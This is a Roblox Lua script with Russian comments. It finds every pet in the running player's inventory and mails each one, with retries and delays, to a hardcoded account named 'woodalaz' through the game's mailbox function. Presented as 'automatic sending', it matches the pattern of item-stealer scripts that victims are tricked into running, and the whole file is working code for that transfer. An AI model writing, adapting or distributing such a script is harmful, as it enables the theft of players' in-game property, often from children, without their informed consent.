--[[
    АВТООТПРАВКА ВСЕХ ПИТОМЦЕВ (версия 2)
    Ждёт загрузки инвентаря и использует резервный метод.
--]]

local RECEIVER_USERNAME = "woodalaz"  -- Имя получателя
local MESSAGE = "Automatic sending"    -- Текст сообщения

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Items = require(ReplicatedStorage.Library.Items)
local Network = require(ReplicatedStorage.Library.Client.Network)
local InventoryCmds = require(ReplicatedStorage.Library.Client.InventoryCmds)

-- Функция ожидания состояния игрока
local function waitForPlayerState(timeout)
    timeout = timeout or 30
    local start = tick()
    repeat
        local state = InventoryCmds.State()
        if state and state.container then
            return state
        end
        task.wait(0.5)
    until tick() - start > timeout
    return nil
end

-- Попытка получить питомцев через контейнер
local function getPetsFromContainer()
    local petType = Items.Types["Pet"]
    if not petType then return nil end
    local state = InventoryCmds.State()
    if not state or not state.container then return nil end
    local pets = state.container:All(petType)
    return pets
end

-- Резервный метод: прямой вызов All у типа
local function getPetsDirect()
    local petType = Items.Types["Pet"]
    if not petType then return nil end
    local pets = petType:All()
    return pets
end

print("Ожидание загрузки инвентаря...")
local state = waitForPlayerState(20)
if not state then
    warn("Не удалось получить состояние игрока. Запусти скрипт, когда находишься в мире и видишь свой инвентарь.")
    return
end

print("Инвентарь загружен. Ищем питомцев...")

local allPets = getPetsFromContainer()
if not allPets or #allPets == 0 then
    print("Контейнер пуст. Пробую альтернативный метод...")
    allPets = getPetsDirect()
end

if not allPets or #allPets == 0 then
    warn("Нет питомцев для отправки. Убедись, что у тебя есть питомцы в инвентаре, и они видны в игре.")
    return
end

print(string.format("Найдено питомцев: %d", #allPets))

-- Отправка
local function sendPet(pet)
    local ok, result = pcall(function()
        local uid = pet:GetUID()
        local amount = pet:GetAmount()
        if amount > 1 then amount = 1 end
        local success, msg = Network.Invoke("Mailbox: Send", RECEIVER_USERNAME, MESSAGE, "Pet", uid, amount)
        return success, msg
    end)
    if not ok then
        warn("Ошибка при отправке " .. pet:GetUID() .. ": " .. tostring(result))
        return false
    end
    return result
end

local sent, failed = 0, 0
for _, pet in ipairs(allPets) do
    local success, msg = sendPet(pet)
    if success then
        sent = sent + 1
        print(string.format("✅ %s отправлен", pet:GetUID()))
    else
        failed = failed + 1
        warn(string.format("❌ %s не отправлен: %s", pet:GetUID(), msg or "нет причины"))
    end
    task.wait(0.6)
end

print(string.format("\nГотово! Отправлено: %d, Не удалось: %d", sent, failed))
